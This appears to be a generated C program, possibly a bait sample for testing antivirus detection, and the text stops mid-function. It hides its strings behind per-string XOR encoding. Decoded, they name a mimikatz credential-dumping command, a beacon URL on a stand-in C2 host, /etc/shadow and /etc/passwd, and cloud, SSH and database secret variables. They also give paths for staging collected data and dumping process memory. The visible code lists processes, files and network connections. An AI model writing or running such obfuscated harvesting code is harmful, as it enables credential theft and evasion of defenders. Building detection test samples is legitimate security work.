// JOCKY build 294E4A93B15FBB2C seed=31337 date=2026-09-03 13:44:43
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>

#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0600
#endif
#if defined(_WIN32)
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <direct.h>
#elif defined(__APPLE__)
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/sysctl.h>
#include <libproc.h>
#else
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#endif

static const volatile uint8_t j_enc_0[] = {0x32, 0x33, 0x30, 0x31, 0x36, 0x37, 0x34, 0x35, 0x3A, 0x3B, 0x63, 0x60, 0x61, 0x66, 0x67, 0x64};
static const char* j_dc_0(void) {
    static char j_rb[17];
    for (int j_i = 0; j_i < 16; j_i++) j_rb[j_i] = j_enc_0[j_i] ^ 2;
    j_rb[16] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_1[] = {0x5E, 0x5F, 0x5C, 0x5D, 0x5A, 0x5B, 0x58, 0x59, 0x56, 0x57, 0x0F, 0x0C, 0x0D, 0x0A, 0x0B, 0x08};
static const char* j_dc_1(void) {
    static char j_rb[17];
    for (int j_i = 0; j_i < 16; j_i++) j_rb[j_i] = j_enc_1[j_i] ^ 110;
    j_rb[16] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_2[] = {0x30, 0x20};
static const char* j_dc_2(void) {
    static char j_rb[3];
    for (int j_i = 0; j_i < 2; j_i++) j_rb[j_i] = j_enc_2[j_i] ^ 66;
    j_rb[2] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_3[] = {0x31, 0x24};
static const char* j_dc_3(void) {
    static char j_rb[3];
    for (int j_i = 0; j_i < 2; j_i++) j_rb[j_i] = j_enc_3[j_i] ^ 70;
    j_rb[2] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_4[] = {0x10, 0x4F, 0x4D, 0x50, 0x5C};
static const char* j_dc_4(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_4[j_i] ^ 63;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_5[] = {0xF7};
static const char* j_dc_5(void) {
    static char j_rb[2];
    for (int j_i = 0; j_i < 1; j_i++) j_rb[j_i] = j_enc_5[j_i] ^ 133;
    j_rb[1] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_6[] = {0xF6};
static const char* j_dc_6(void) {
    static char j_rb[2];
    for (int j_i = 0; j_i < 1; j_i++) j_rb[j_i] = j_enc_6[j_i] ^ 252;
    j_rb[1] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_7[] = {0xAA};
static const char* j_dc_7(void) {
    static char j_rb[2];
    for (int j_i = 0; j_i < 1; j_i++) j_rb[j_i] = j_enc_7[j_i] ^ 216;
    j_rb[1] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_8[] = {0xE2};
static const char* j_dc_8(void) {
    static char j_rb[2];
    for (int j_i = 0; j_i < 1; j_i++) j_rb[j_i] = j_enc_8[j_i] ^ 221;
    j_rb[1] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_9[] = {0xB4, 0xB1, 0xAB, 0xAC, 0xBD, 0xB6};
static const char* j_dc_9(void) {
    static char j_rb[7];
    for (int j_i = 0; j_i < 6; j_i++) j_rb[j_i] = j_enc_9[j_i] ^ 248;
    j_rb[6] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_10[] = {0x53, 0x45, 0x42, 0x57, 0x54, 0x5A, 0x5F, 0x45, 0x5E, 0x53, 0x52};
static const char* j_dc_10(void) {
    static char j_rb[12];
    for (int j_i = 0; j_i < 11; j_i++) j_rb[j_i] = j_enc_10[j_i] ^ 22;
    j_rb[11] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_11[] = {0x29, 0x26, 0x25, 0x39, 0x2F, 0x35, 0x3D, 0x2B, 0x23, 0x3E};
static const char* j_dc_11(void) {
    static char j_rb[11];
    for (int j_i = 0; j_i < 10; j_i++) j_rb[j_i] = j_enc_11[j_i] ^ 106;
    j_rb[10] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_12[] = {0x2A, 0x37, 0x33, 0x3B, 0x21, 0x29, 0x3F, 0x37, 0x2A};
static const char* j_dc_12(void) {
    static char j_rb[10];
    for (int j_i = 0; j_i < 9; j_i++) j_rb[j_i] = j_enc_12[j_i] ^ 126;
    j_rb[9] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_13[] = {0xCE, 0xD5, 0xC9, 0xC4, 0xD3};
static const char* j_dc_13(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_13[j_i] ^ 129;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_14[] = {0x52, 0x59, 0x48, 0x4F, 0x48, 0x5D, 0x48, 0x1C, 0x11, 0x5D, 0x52, 0x1C, 0x11, 0x4C, 0x1C, 0x48, 0x5F, 0x4C, 0x1C, 0x0E, 0x02, 0x13, 0x58, 0x59, 0x4A, 0x13, 0x52, 0x49, 0x50, 0x50};
static const char* j_dc_14(void) {
    static char j_rb[31];
    for (int j_i = 0; j_i < 30; j_i++) j_rb[j_i] = j_enc_14[j_i] ^ 60;
    j_rb[30] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_15[] = {0xDB};
static const char* j_dc_15(void) {
    static char j_rb[2];
    for (int j_i = 0; j_i < 1; j_i++) j_rb[j_i] = j_enc_15[j_i] ^ 169;
    j_rb[1] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_16[] = {0x5C, 0x4B, 0x58};
static const char* j_dc_16(void) {
    static char j_rb[4];
    for (int j_i = 0; j_i < 3; j_i++) j_rb[j_i] = j_enc_16[j_i] ^ 40;
    j_rb[3] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_17[] = {0x99, 0xC6, 0xC4, 0xD9, 0xD5, 0x99, 0xD8, 0xD3, 0xC2, 0x99, 0xC2, 0xD5, 0xC6};
static const char* j_dc_17(void) {
    static char j_rb[14];
    for (int j_i = 0; j_i < 13; j_i++) j_rb[j_i] = j_enc_17[j_i] ^ 182;
    j_rb[13] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_18[] = {0x20, 0x7F, 0x7D, 0x60, 0x6C, 0x20, 0x61, 0x6A, 0x7B, 0x20, 0x7B, 0x6C, 0x7F, 0x39};
static const char* j_dc_18(void) {
    static char j_rb[15];
    for (int j_i = 0; j_i < 14; j_i++) j_rb[j_i] = j_enc_18[j_i] ^ 15;
    j_rb[14] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_19[] = {0x2C, 0x2F, 0x28, 0x29, 0x38};
static const char* j_dc_19(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_19[j_i] ^ 100;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_20[] = {0x50, 0x53, 0x5B, 0x4D, 0x44};
static const char* j_dc_20(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_20[j_i] ^ 24;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_21[] = {0x5D, 0x5E, 0x56, 0x47, 0x49};
static const char* j_dc_21(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_21[j_i] ^ 21;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_22[] = {0x31, 0x32, 0x2C, 0x25};
static const char* j_dc_22(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_22[j_i] ^ 121;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_23[] = {0xB4, 0xA1};
static const char* j_dc_23(void) {
    static char j_rb[3];
    for (int j_i = 0; j_i < 2; j_i++) j_rb[j_i] = j_enc_23[j_i] ^ 195;
    j_rb[2] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_24[] = {0x96, 0x96, 0x96, 0x8B, 0xEE, 0xE2, 0xE8, 0xEA, 0xF9, 0x8B, 0xC6, 0xCA, 0xD9, 0xC0, 0xCE, 0xD9, 0x8B, 0x96, 0x96, 0x96};
static const char* j_dc_24(void) {
    static char j_rb[21];
    for (int j_i = 0; j_i < 20; j_i++) j_rb[j_i] = j_enc_24[j_i] ^ 171;
    j_rb[20] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_25[] = {0x5A, 0x5A, 0x5A, 0x47, 0x04, 0x15, 0x02, 0x03, 0x02, 0x09, 0x13, 0x0E, 0x06, 0x0B, 0x47, 0x0A, 0x06, 0x15, 0x0C, 0x02, 0x15, 0x47, 0x5A, 0x5A, 0x5A};
static const char* j_dc_25(void) {
    static char j_rb[26];
    for (int j_i = 0; j_i < 25; j_i++) j_rb[j_i] = j_enc_25[j_i] ^ 103;
    j_rb[25] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_26[] = {0x9E, 0x88, 0x86, 0x98, 0x9F, 0x81, 0x9E, 0x8C, 0xD7, 0xD7, 0x81, 0x82, 0x8A, 0x82, 0x83, 0x9D, 0x8C, 0x9E, 0x9E, 0x9A, 0x82, 0x9F, 0x89, 0x9E};
static const char* j_dc_26(void) {
    static char j_rb[25];
    for (int j_i = 0; j_i < 24; j_i++) j_rb[j_i] = j_enc_26[j_i] ^ 237;
    j_rb[24] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_27[] = {0xED, 0xED, 0xED, 0xF0, 0xB3, 0xE2, 0xF0, 0xBD, 0xB1, 0xA2, 0xBB, 0xB5, 0xA2, 0xF0, 0xED, 0xED, 0xED};
static const char* j_dc_27(void) {
    static char j_rb[18];
    for (int j_i = 0; j_i < 17; j_i++) j_rb[j_i] = j_enc_27[j_i] ^ 208;
    j_rb[17] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_28[] = {0x09, 0x58, 0x44, 0x0F, 0x1C, 0x03, 0x06, 0x47, 0x0E, 0x05, 0x07, 0x0B, 0x03, 0x04, 0x44, 0x09, 0x05, 0x07, 0x45, 0x08, 0x0F, 0x0B, 0x09, 0x05, 0x04};
static const char* j_dc_28(void) {
    static char j_rb[26];
    for (int j_i = 0; j_i < 25; j_i++) j_rb[j_i] = j_enc_28[j_i] ^ 106;
    j_rb[25] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_29[] = {0xAE, 0xA8, 0xAF, 0xBF};
static const char* j_dc_29(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_29[j_i] ^ 218;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_30[] = {0xB9, 0xBE, 0xB3, 0xAC, 0xBA};
static const char* j_dc_30(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_30[j_i] ^ 223;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_31[] = {0x84, 0x84, 0x84, 0x99, 0xC9, 0xCB, 0xD6, 0xDA, 0xDC, 0xCA, 0xCA, 0x99, 0xD5, 0xD0, 0xCA, 0xCD, 0x99, 0x84, 0x84, 0x84};
static const char* j_dc_31(void) {
    static char j_rb[21];
    for (int j_i = 0; j_i < 20; j_i++) j_rb[j_i] = j_enc_31[j_i] ^ 185;
    j_rb[20] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_32[] = {0xB3, 0xB3, 0xB3, 0xAE, 0xA1, 0xEB, 0xFA, 0xED, 0xA1, 0xFE, 0xEF, 0xFD, 0xFD, 0xF9, 0xEA, 0xAE, 0xB3, 0xB3, 0xB3};
static const char* j_dc_32(void) {
    static char j_rb[20];
    for (int j_i = 0; j_i < 19; j_i++) j_rb[j_i] = j_enc_32[j_i] ^ 142;
    j_rb[19] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_33[] = {0xCC, 0x86, 0x97, 0x80, 0xCC, 0x93, 0x82, 0x90, 0x90, 0x94, 0x87};
static const char* j_dc_33(void) {
    static char j_rb[12];
    for (int j_i = 0; j_i < 11; j_i++) j_rb[j_i] = j_enc_33[j_i] ^ 227;
    j_rb[11] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_34[] = {0x3E, 0x3E, 0x3E, 0x23, 0x2C, 0x66, 0x77, 0x60, 0x2C, 0x70, 0x6B, 0x62, 0x67, 0x6C, 0x74, 0x23, 0x2B, 0x61, 0x66, 0x70, 0x77, 0x2E, 0x66, 0x65, 0x65, 0x6C, 0x71, 0x77, 0x2A, 0x23, 0x3E, 0x3E, 0x3E};
static const char* j_dc_34(void) {
    static char j_rb[34];
    for (int j_i = 0; j_i < 33; j_i++) j_rb[j_i] = j_enc_34[j_i] ^ 3;
    j_rb[33] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_35[] = {0x5A, 0x10, 0x01, 0x16, 0x5A, 0x06, 0x1D, 0x14, 0x11, 0x1A, 0x02};
static const char* j_dc_35(void) {
    static char j_rb[12];
    for (int j_i = 0; j_i < 11; j_i++) j_rb[j_i] = j_enc_35[j_i] ^ 117;
    j_rb[11] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_36[] = {0x3A, 0x3A, 0x3A, 0x27, 0x62, 0x69, 0x71, 0x6E, 0x75, 0x68, 0x69, 0x6A, 0x62, 0x69, 0x73, 0x27, 0x2F, 0x64, 0x75, 0x62, 0x63, 0x62, 0x69, 0x73, 0x6E, 0x66, 0x6B, 0x2A, 0x75, 0x62, 0x6B, 0x62, 0x71, 0x66, 0x69, 0x73, 0x2E, 0x27, 0x3A, 0x3A, 0x3A};
static const char* j_dc_36(void) {
    static char j_rb[42];
    for (int j_i = 0; j_i < 41; j_i++) j_rb[j_i] = j_enc_36[j_i] ^ 7;
    j_rb[41] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_37[] = {0xCA, 0xCC, 0xDA, 0xCD};
static const char* j_dc_37(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_37[j_i] ^ 159;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_38[] = {0xA0, 0xA6, 0xA1, 0xB1};
static const char* j_dc_38(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_38[j_i] ^ 212;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_39[] = {0x62, 0x65, 0x68, 0x77, 0x61};
static const char* j_dc_39(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_39[j_i] ^ 4;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_40[] = {0xFD, 0xFA, 0xF8, 0xF0};
static const char* j_dc_40(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_40[j_i] ^ 181;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_41[] = {0xEB, 0xEB, 0xF0, 0xE7, 0xF9, 0xED, 0xEC, 0xF0, 0xE7, 0xEB, 0xF7, 0xFB, 0xF3};
static const char* j_dc_41(void) {
    static char j_rb[14];
    for (int j_i = 0; j_i < 13; j_i++) j_rb[j_i] = j_enc_41[j_i] ^ 184;
    j_rb[13] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_42[] = {0xA2, 0xA4, 0xA3, 0xB3};
static const char* j_dc_42(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_42[j_i] ^ 214;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_43[] = {0x3C, 0x3B, 0x36, 0x29, 0x3F};
static const char* j_dc_43(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_43[j_i] ^ 90;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_44[] = {0xEF, 0xF9, 0xFD, 0xF1, 0xEF, 0xED, 0xED, 0xEB, 0xFD, 0xFD, 0xF1, 0xE5, 0xEB, 0xF7, 0xF1, 0xE7, 0xEA};
static const char* j_dc_44(void) {
    static char j_rb[18];
    for (int j_i = 0; j_i < 17; j_i++) j_rb[j_i] = j_enc_44[j_i] ^ 174;
    j_rb[17] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_45[] = {0x8B, 0x9D, 0x99, 0x95, 0x99, 0x8F, 0x89, 0x98, 0x8F, 0x9E, 0x95, 0x8B, 0x89, 0x89, 0x8F, 0x99, 0x99, 0x95, 0x81, 0x8F, 0x93};
static const char* j_dc_45(void) {
    static char j_rb[22];
    for (int j_i = 0; j_i < 21; j_i++) j_rb[j_i] = j_enc_45[j_i] ^ 202;
    j_rb[21] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_46[] = {0xBB, 0xBE, 0xAB, 0xBE, 0xBD, 0xBE, 0xAC, 0xBA, 0xA0, 0xAA, 0xAD, 0xB3};
static const char* j_dc_46(void) {
    static char j_rb[13];
    for (int j_i = 0; j_i < 12; j_i++) j_rb[j_i] = j_enc_46[j_i] ^ 255;
    j_rb[12] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_47[] = {0x5F, 0x5F, 0x5F, 0x42, 0x0A, 0x0D, 0x0F, 0x07, 0x42, 0x06, 0x0B, 0x10, 0x42, 0x4A, 0x10, 0x07, 0x01, 0x0D, 0x0C, 0x4B, 0x42, 0x5F, 0x5F, 0x5F};
static const char* j_dc_47(void) {
    static char j_rb[25];
    for (int j_i = 0; j_i < 24; j_i++) j_rb[j_i] = j_enc_47[j_i] ^ 98;
    j_rb[24] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_48[] = {0x67, 0x61, 0x66, 0x76};
static const char* j_dc_48(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_48[j_i] ^ 19;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_49[] = {0xE6, 0xE1, 0xEC, 0xF3, 0xE5};
static const char* j_dc_49(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_49[j_i] ^ 128;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_50[] = {0x10, 0x17, 0x15, 0x1D};
static const char* j_dc_50(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_50[j_i] ^ 88;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_51[] = {0x88, 0x8E, 0x89, 0x99};
static const char* j_dc_51(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_51[j_i] ^ 252;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_52[] = {0xAD, 0xAA, 0xA7, 0xB8, 0xAE};
static const char* j_dc_52(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_52[j_i] ^ 203;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_53[] = {0x95, 0x95, 0x95, 0x88, 0xDB, 0xDC, 0xC9, 0xCF, 0xCD, 0xCC, 0x88, 0xCB, 0xC7, 0xC4, 0xC4, 0xCD, 0xCB, 0xDC, 0xC1, 0xC7, 0xC6, 0x88, 0x80, 0xCE, 0xDB, 0x86, 0xDF, 0xDA, 0xC1, 0xDC, 0xCD, 0x88, 0xDC, 0xC7, 0x88, 0x87, 0xDC, 0xC5, 0xD8, 0x81, 0x88, 0x95, 0x95, 0x95};
static const char* j_dc_53(void) {
    static char j_rb[45];
    for (int j_i = 0; j_i < 44; j_i++) j_rb[j_i] = j_enc_53[j_i] ^ 168;
    j_rb[44] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_54[] = {0xA3, 0xF8, 0xE1, 0xFC, 0xA3, 0xED, 0xFA, 0xD3, 0xEE, 0xED, 0xE5, 0xF8, 0xD3, 0xEF, 0xE3, 0xE0, 0xE0, 0xE9, 0xEF, 0xF8, 0xE9, 0xE8, 0xA2, 0xF8, 0xF4, 0xF8};
static const char* j_dc_54(void) {
    static char j_rb[27];
    for (int j_i = 0; j_i < 26; j_i++) j_rb[j_i] = j_enc_54[j_i] ^ 140;
    j_rb[26] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_55[] = {0x75, 0x73, 0x74, 0x64};
static const char* j_dc_55(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_55[j_i] ^ 1;
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_56[] = {0x38, 0x3F, 0x32, 0x2D, 0x3B};
static const char* j_dc_56(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_56[j_i] ^ 94;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_57[] = {0x8C, 0xD7, 0xCE, 0xD3, 0x8C, 0xC2, 0xD5, 0xFC, 0xC1, 0xC2, 0xCA, 0xD7, 0xFC, 0xC0, 0xCC, 0xCF, 0xCF, 0xC6, 0xC0, 0xD7, 0xC6, 0xC7, 0x8D, 0xD7, 0xDB, 0xD7};
static const char* j_dc_57(void) {
    static char j_rb[27];
    for (int j_i = 0; j_i < 26; j_i++) j_rb[j_i] = j_enc_57[j_i] ^ 163;
    j_rb[26] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_58[] = {0x90, 0x90, 0x90, 0x8D, 0xDD, 0xDF, 0xC2, 0xCE, 0xC8, 0xDE, 0xDE, 0x8D, 0xC0, 0xC8, 0xC0, 0xC2, 0xDF, 0xD4, 0x8D, 0xC9, 0xD8, 0xC0, 0xDD, 0x8D, 0x85, 0xFA, 0xC4, 0xC3, 0xC9, 0xC2, 0xDA, 0xDE, 0x8D, 0xC2, 0xC3, 0xC1, 0xD4, 0x81, 0x8D, 0xDD, 0xC4, 0xC9, 0x90, 0x99, 0x84, 0x8D, 0x90, 0x90, 0x90};
static const char* j_dc_58(void) {
    static char j_rb[50];
    for (int j_i = 0; j_i < 49; j_i++) j_rb[j_i] = j_enc_58[j_i] ^ 173;
    j_rb[49] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_59[] = {0x57, 0x2E, 0x48, 0x60, 0x71, 0x79, 0x64, 0x48, 0x77, 0x66, 0x71, 0x70, 0x4B, 0x70, 0x61, 0x79, 0x64, 0x3A, 0x76, 0x7D, 0x7A};
static const char* j_dc_59(void) {
    static char j_rb[22];
    for (int j_i = 0; j_i < 21; j_i++) j_rb[j_i] = j_enc_59[j_i] ^ 20;
    j_rb[21] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_60[] = {0x48, 0x43, 0x42, 0x49};
static const char* j_dc_60(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_60[j_i] ^ 44;
    j_rb[4] = 0;
    return j_rb;
}

static int32_t j_str_len(const char* s) { return (int32_t)strlen(s); }
static bool j_str_eq(const char* a, const char* b) { return strcmp(a, b) == 0; }

static char j_buf[65536];
#define J_BUF_CAP (sizeof j_buf)

static void j_json_escape(char* out, size_t cap, const char* s) {
    size_t o = 0;
    for (const char* p = s; *p && o + 8 < cap; ++p) {
        unsigned char c = (unsigned char)*p;
        switch (c) {
            case '"': out[o++] = '\\'; out[o++] = '"'; break;
            case '\\': out[o++] = '\\'; out[o++] = '\\'; break;
            case '\n': out[o++] = '\\'; out[o++] = 'n'; break;
            case '\r': out[o++] = '\\'; out[o++] = 'r'; break;
            case '\t': out[o++] = '\\'; out[o++] = 't'; break;
            default:
                if (c < 0x20) {
                    out[o++] = '\\'; out[o++] = 'u'; out[o++] = '0'; out[o++] = '0';
                    out[o++] = j_dc_0()[c >> 4];
                    out[o++] = j_dc_1()[c & 15];
                } else out[o++] = (char)c;
        }
    }
    out[o] = '\0';
}

static const char* j_sys_now(void) {
    time_t t = time(NULL);
#if defined(_WIN32)
    struct tm* tmv = localtime(&t);
    strftime(j_buf, J_BUF_CAP, "%Y-%m-%dT%H:%M:%S", tmv);
#else
    struct tm tmv;
    localtime_r(&t, &tmv);
    strftime(j_buf, J_BUF_CAP, "%Y-%m-%dT%H:%M:%S", &tmv);
#endif
    return j_buf;
}

static void j_sys_sleep(int32_t ms) {
#if defined(_WIN32)
    Sleep((DWORD)ms);
#else
    struct timespec ts;
    ts.tv_sec = ms / 1000;
    ts.tv_nsec = (long)(ms % 1000) * 1000000L;
    nanosleep(&ts, NULL);
#endif
}

static const char* j_sys_cwd(void) {
#if defined(_WIN32)
    _getcwd(j_buf, (int)J_BUF_CAP);
#else
    getcwd(j_buf, J_BUF_CAP);
#endif
    return j_buf;
}

static const char* j_env_get(const char* name) {
    const char* v = getenv(name);
    return v ? v : "";
}

static bool j_fs_exists(const char* path) {
#if defined(_WIN32)
    return GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES;
#else
    return access(path, F_OK) == 0;
#endif
}

static const char* j_fs_read(const char* path) {
    FILE* f = fopen(path, j_dc_2());
    if (!f) return "";
    size_t n = fread(j_buf, 1, J_BUF_CAP - 1, f);
    fclose(f);
    j_buf[n] = '\0';
    return j_buf;
}

static void j_fs_write(const char* path, const char* data) {
    FILE* f = fopen(path, j_dc_3());
    if (f) { fputs(data, f); fclose(f); }
}

static const char* j_fs_list(const char* dir) {
    size_t off = 0;
    j_buf[off++] = '[';
    int first = 1;
#if defined(_WIN32)
    char pattern[1024];
    snprintf(pattern, sizeof pattern, "%s\\*", dir);
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(pattern, &fd);
    if (h != INVALID_HANDLE_VALUE) {
        do {
            if (fd.cFileName[0] == '.') continue;
            if (off > J_BUF_CAP - 200) break;
            if (!first) j_buf[off++] = ',';
            first = 0;
            char esc[1024];
            j_json_escape(esc, sizeof esc, fd.cFileName);
            int n = snprintf(j_buf + off, J_BUF_CAP - off, "\"%s\"", esc);
            off += (size_t)(n > 0 ? n : 0);
        } while (FindNextFileA(h, &fd));
        FindClose(h);
    }
#else
    DIR* d = opendir(dir);
    if (d) {
        struct dirent* de;
        while ((de = readdir(d)) != NULL) {
            if (de->d_name[0] == '.') continue;
            if (off > J_BUF_CAP - 200) break;
            if (!first) j_buf[off++] = ',';
            first = 0;
            char esc[1024];
            j_json_escape(esc, sizeof esc, de->d_name);
            int n = snprintf(j_buf + off, J_BUF_CAP - off, "\"%s\"", esc);
            off += (size_t)(n > 0 ? n : 0);
        }
        closedir(d);
    }
#endif
    j_buf[off++] = ']';
    j_buf[off] = '\0';
    return j_buf;
}

static const char* j_sys_process_list(void) {
    size_t off = 0;
    j_buf[off++] = '[';
    int first = 1;
#if defined(_WIN32)
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof pe;
        if (Process32FirstW(snap, &pe)) {
            do {
                if (off > J_BUF_CAP - 400) break;
                char name[1024];
                size_t k = 0;
                for (size_t i = 0; pe.szExeFile[i] && k + 1 < sizeof name; ++i)
                    name[k++] = (char)(pe.szExeFile[i] & 0xFF);
                name[k] = '\0';
                if (!first) j_buf[off++] = ',';
                first = 0;
                char esc[2048];
                j_json_escape(esc, sizeof esc, name);
                int n = snprintf(j_buf + off, J_BUF_CAP - off, "{\"pid\":%lu,\"name\":\"%s\"}", (unsigned long)pe.th32ProcessID, esc);
                off += (size_t)(n > 0 ? n : 0);
            } while (Process32NextW(snap, &pe));
        }
        CloseHandle(snap);
    }
#elif defined(__APPLE__)
    int all_pids[8192];
    int np = proc_listallpids(all_pids, sizeof all_pids);
    for (int i = 0; i < np; ++i) {
        int pid = all_pids[i];
        if (off > J_BUF_CAP - 400) break;
        char name[256];
        int len = proc_name(pid, name, sizeof name);
        if (len <= 0) snprintf(name, sizeof name, "pid_%d", pid);
        if (!first) j_buf[off++] = ',';
        first = 0;
        char esc[512];
        j_json_escape(esc, sizeof esc, name);
        int n = snprintf(j_buf + off, J_BUF_CAP - off, "{\"pid\":%d,\"name\":\"%s\"}", pid, esc);
        off += (size_t)(n > 0 ? n : 0);
    }
#else
    DIR* d = opendir(j_dc_4());
    if (d) {
        struct dirent* de;
        while ((de = readdir(d)) != NULL) {
            if (de->d_name[0] < '0' || de->d_name[0] > '9') continue;
            int pid = atoi(de->d_name);
            char p[64], name[256];
            snprintf(p, sizeof p, "/proc/%d/comm", pid);
            FILE* f = fopen(p, j_dc_5());
            if (f) {
                if (fgets(name, sizeof name, f)) name[strcspn(name, j_dc_6())] = '\0';
                fclose(f);
                if (off > J_BUF_CAP - 400) break;
                if (!first) j_buf[off++] = ',';
                first = 0;
                char esc[512];
                j_json_escape(esc, sizeof esc, name);
                int n = snprintf(j_buf + off, J_BUF_CAP - off, "{\"pid\":%d,\"name\":\"%s\"}", pid, esc);
                off += (size_t)(n > 0 ? n : 0);
            }
        }
        closedir(d);
    }
#endif
    j_buf[off++] = ']';
    j_buf[off] = '\0';
    return j_buf;
}

static void j_net_proc_parse(const char* path, size_t* off, int* first) {
    FILE* f = fopen(path, j_dc_7());
    if (!f) return;
    char line[512];
    int skip = 1;
    while (fgets(line, sizeof line, f)) {
